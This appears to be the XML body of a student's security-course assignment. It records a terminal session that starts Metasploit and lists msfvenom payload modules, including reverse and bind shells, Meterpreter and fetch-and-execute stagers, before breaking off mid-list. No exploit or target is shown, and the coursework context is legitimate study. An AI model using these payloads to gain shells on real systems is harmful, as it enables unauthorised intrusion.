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3f9" officeooo:paragraph-rsid="0008f3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ayem Shehzad</text:p>
      <text:p text:style-name="P1">21-10188</text:p>
      <text:p text:style-name="P1">Assignment 4<text:line-break/><text:line-break/>Code:<text:line-break/><text:line-break/><text:line-break/>daayem@daayem-Victus-by-HP-Gaming-Laptop-15-fa1xxx:~$ msfconsole</text:p>
      <text:p text:style-name="P1">This copy of metasploit-framework is more than two weeks old.</text:p>
      <text:p text:style-name="P1"><text:s/>Consider running 'msfupdate' to update to the latest version.</text:p>
      <text:p text:style-name="P1">Metasploit tip: View missing module options with show missing</text:p>
      <text:p text:style-name="P1"><text:s text:c="50"/></text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>+-------------------------------------------------------+</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s/>METASPLOIT by Rapid7 <text:s text:c="32"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>+---------------------------+---------------------------+</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="5"/>__________________ <text:s text:c="2"/>| <text:s text:c="26"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s/>==c(______(o(______(_() <text:s/>| |""""""""""""|======[*** <text:s/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="12"/>)=\ <text:s text:c="10"/>| | <text:s/>EXPLOIT <text:s text:c="2"/>\ <text:s text:c="11"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="11"/>// \\ <text:s text:c="9"/>| |_____________\_______ <text:s text:c="3"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="10"/>// <text:s text:c="2"/>\\ <text:s text:c="8"/>| |==[msf &gt;]============\ <text:s text:c="2"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="9"/>// <text:s text:c="4"/>\\ <text:s text:c="7"/>| |______________________\ <text:s/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="8"/>// RECON \\ <text:s text:c="6"/>| \(@)(@)(@)(@)(@)(@)(@)/ <text:s text:c="2"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="7"/>// <text:s text:c="8"/>\\ <text:s text:c="5"/>| <text:s/>********************* <text:s text:c="3"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>+---------------------------+---------------------------+</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="5"/>o O o <text:s text:c="15"/>| <text:s text:c="7"/>\'\/\/\/'/ <text:s text:c="8"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="13"/>o O <text:s text:c="9"/>| <text:s text:c="8"/>)======( <text:s text:c="9"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s text:c="16"/>o <text:s text:c="8"/>| <text:s text:c="6"/>.' <text:s/>LOOT <text:s/>'. <text:s text:c="7"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| |^^^^^^^^^^^^^^|l___ <text:s text:c="5"/>| <text:s text:c="5"/>/ <text:s text:c="3"/>_||__ <text:s text:c="2"/>\ <text:s text:c="6"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| | <text:s text:c="3"/>PAYLOAD <text:s text:c="4"/>|""\___, | <text:s text:c="4"/>/ <text:s text:c="3"/>(_||_ <text:s text:c="4"/>\ <text:s text:c="5"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| |________________|__|)__| | <text:s text:c="3"/>| <text:s text:c="4"/>__||_) <text:s text:c="4"/>| <text:s text:c="4"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| |(@)(@)"""**|(@)(@)**|(@) | <text:s text:c="3"/>" <text:s text:c="6"/>|| <text:s text:c="6"/>" <text:s text:c="4"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>| <text:s/>= = = = = = = = = = = = <text:s/>| <text:s text:c="4"/>'--------------' <text:s text:c="5"/>|</text:p>
      <text:p text:style-name="P1"><text:s text:c="2"/>+---------------------------+---------------------------+</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:s text:c="7"/>=[ metasploit v6.3.48-dev- <text:s text:c="24"/>]</text:p>
      <text:p text:style-name="P1">+ -- --=[ 2380 exploits - 1234 auxiliary - 417 post <text:s text:c="6"/>]</text:p>
      <text:p text:style-name="P1">+ -- --=[ 1388 payloads - 46 encoders - 11 nops <text:s text:c="10"/>]</text:p>
      <text:p text:style-name="P1">+ -- --=[ 9 evasion <text:s text:c="38"/>]</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Metasploit Documentation: https://docs.metasploit.com/</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">msf6 &gt; msfvenom -l payloads</text:p>
      <text:p text:style-name="P1">[*] exec: msfvenom -l payloads</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Overriding user environment variable 'OPENSSL_CONF' to enable legacy functions.</text:p>
      <text:p text:style-name="P1">msfvenom -l encoders</text:p>
      <text:p text:style-name="P1">Framework Payloads (1388 total) [--payload &lt;value&gt;]</text:p>
      <text:p text:style-name="P1">===================================================</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:s text:c="4"/>Name <text:s text:c="28"/>Description</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>---- <text:s text:c="28"/>-----------</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>aix/ppc/shell_bind_tcp <text:s text:c="10"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>aix/ppc/shell_find_port <text:s text:c="9"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>aix/ppc/shell_interact <text:s text:c="10"/>Simply execve /bin/sh (for inet</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d programs)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>aix/ppc/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/meterpreter/reverse_htt <text:s/>Run a meterpreter server in And</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>roid. Tunnel communication over</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>HTTP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/meterpreter/reverse_htt <text:s/>Run a meterpreter server in And</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ps <text:s text:c="30"/>roid. Tunnel communication over</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>HTTPS</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/meterpreter/reverse_tcp <text:s/>Run a meterpreter server in And</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>roid. Connect back stager</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/meterpreter_reverse_htt <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>p <text:s text:c="31"/>awn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/meterpreter_reverse_htt <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ps <text:s text:c="30"/>awn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/meterpreter_reverse_tcp <text:s/>Connect back to the attacker an</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d spawn a Meterpreter shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/shell/reverse_http <text:s text:c="6"/>Spawn a piped command shell (sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TP</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/shell/reverse_https <text:s text:c="5"/>Spawn a piped command shell (sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Tunnel communication over HT</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>TPS</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>android/shell/reverse_tcp <text:s text:c="7"/>Spawn a piped command shell (sh</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>). Connect back stager</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/aarch64/meterpreter_r <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_http <text:s text:c="21"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/aarch64/meterpreter_r <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_https <text:s text:c="20"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/aarch64/meterpreter_r <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>everse_tcp <text:s text:c="22"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/aarch64/shell_reverse <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>_tcp <text:s text:c="28"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/armle/meterpreter_rev <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_http <text:s text:c="23"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/armle/meterpreter_rev <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_https <text:s text:c="22"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>apple_ios/armle/meterpreter_rev <text:s/>Run the Meterpreter / Mettle se</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>rver payload (stageless)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/sparc/shell_bind_tcp <text:s text:c="8"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/sparc/shell_reverse_tcp <text:s text:c="5"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/vax/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/exec <text:s text:c="20"/>Execute an arbitrary command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/shell_bind_ipv6_tcp <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>wn a command shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/shell_bind_tcp <text:s text:c="10"/>Bind an arbitrary command to an</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>arbitrary port</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/shell_bind_tcp_small <text:s text:c="4"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/shell_reverse_ipv6_tcp <text:s text:c="2"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x64/shell_reverse_tcp_small <text:s/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/exec <text:s text:c="20"/>Execute an arbitrary command</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/metsvc_bind_tcp <text:s text:c="9"/>Stub payload for interacting wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th a Meterpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/metsvc_reverse_tcp <text:s text:c="6"/>Stub payload for interacting wi</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>th a Meterpreter Service</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell/bind_ipv6_tcp <text:s text:c="5"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection over I</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Pv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell/bind_tcp <text:s text:c="10"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell/find_tag <text:s text:c="10"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Use an established connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell/reverse_ipv6_tcp <text:s text:c="2"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker o</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ver IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell/reverse_tcp <text:s text:c="7"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell_bind_tcp <text:s text:c="10"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell_bind_tcp_ipv6 <text:s text:c="5"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell_find_port <text:s text:c="9"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell_find_tag <text:s text:c="10"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection (proxy/nat safe)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell_reverse_tcp <text:s text:c="7"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsd/x86/shell_reverse_tcp_ipv6 <text:s text:c="2"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsdi/x86/shell/bind_tcp <text:s text:c="9"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Listen for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsdi/x86/shell/reverse_tcp <text:s text:c="6"/>Spawn a command shell (staged).</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>Connect back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsdi/x86/shell_bind_tcp <text:s text:c="9"/>Listen for a connection and spa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>wn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsdi/x86/shell_find_port <text:s text:c="8"/>Spawn a shell on an established</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bsdi/x86/shell_reverse_tcp <text:s text:c="6"/>Connect back to attacker and sp</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>awn a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/mips64/meterpret <text:s/>Fetch and execute a MIPS64 payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_http <text:s text:c="17"/>oad from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cmd/linux/http/mips64/meterpret <text:s/>Fetch and execute a MIPS64 payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_https <text:s text:c="16"/>oad from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/mips64/meterpret <text:s/>Fetch and execute a MIPS64 payl</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>er_reverse_tcp <text:s text:c="18"/>oad from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/exec <text:s text:c="9"/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d from an HTTP server. Execute</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>an arbitrary command or just a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>/bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/meterpreter/ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="24"/>d from an HTTP server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/meterpreter/ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_sctp <text:s text:c="20"/>d from an HTTP server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/meterpreter/ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from an HTTP server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/meterpreter_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_http <text:s text:c="20"/>d from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/meterpreter_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_https <text:s text:c="19"/>d from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/meterpreter_ <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_tcp <text:s text:c="21"/>d from an HTTP server.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/pingback_bin <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>d_tcp <text:s text:c="27"/>d from an HTTP server. Accept a</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>connection from attacker and r</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>eport UUID (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/pingback_rev <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>erse_tcp <text:s text:c="24"/>d from an HTTP server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and report UUI</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>D (Linux x64)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell/bind_t <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>d from an HTTP server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>command shell (staged). Listen</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>for a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell/revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_sctp <text:s text:c="26"/>d from an HTTP server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>command shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell/revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>d from an HTTP server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>command shell (staged). Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>back to the attacker</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell_bind_i <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>pv6_tcp <text:s text:c="25"/>d from an HTTP server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or an IPv6 connection and spawn</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>a command shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell_bind_t <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cp <text:s text:c="30"/>d from an HTTP server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection and spawn a com</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell_bind_t <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="4"/>cp_random_port <text:s text:c="18"/>d from an HTTP server. Listen f</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>or a connection in a random por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t and spawn a command shell. Us</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>e nmap to discover the open por</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t: 'nmap -sS target -p-'.</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell_find_p <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>ort <text:s text:c="29"/>d from an HTTP server. Spawn a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>shell on an established connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ion</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell_revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_ipv6_tcp <text:s text:c="22"/>d from an HTTP server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x64/shell_revers <text:s/>Fetch and execute an x64 payloa</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>e_tcp <text:s text:c="27"/>d from an HTTP server. Connect</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>back to attacker and spawn a co</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>mmand shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/adduser <text:s text:c="6"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from an HTTP server. Create a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>new user with UID 0</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/chmod <text:s text:c="8"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from an HTTP server. Runs chmo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>d on specified file with specif</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ied mode</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/exec <text:s text:c="9"/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="38"/>from an HTTP server. Execute a</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>n arbitrary command or just a /</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>bin/sh shell</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/generic/debu <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>g_trap <text:s text:c="27"/>from an HTTP server. Generate</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a debug trap in the target proc</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ess</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/generic/tigh <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>t_loop <text:s text:c="27"/>from an HTTP server. Generate</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>a tight loop in the target proc</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ess</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp <text:s text:c="20"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection (Linux x86</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_ipv6_tcp_uuid <text:s text:c="15"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r an IPv6 connection with UUID</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>Support (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_nonx_tcp <text:s text:c="20"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp <text:s text:c="25"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>r a connection (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>bind_tcp_uuid <text:s text:c="20"/>from an HTTP server. Listen fo</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="37"/>r a connection with UUID Suppor</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>t (Linux x86)</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>find_tag <text:s text:c="25"/>from an HTTP server. Use an es</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>tablished connection</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_ipv6_tcp <text:s text:c="17"/>from an HTTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to attacker over IPv6</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>cmd/linux/http/x86/meterpreter/ <text:s/>Fetch and execute a x86 payload</text:p>
      <text:p text:style-name="P1"><text:s text:c="4"/>reverse_nonx_tcp <text:s text:c="17"/>from an HTTP server. Connect b</text:p>
      <text:p text:style-name="P1"><text:s text:c="37"/>ack to the attacker</text:p>
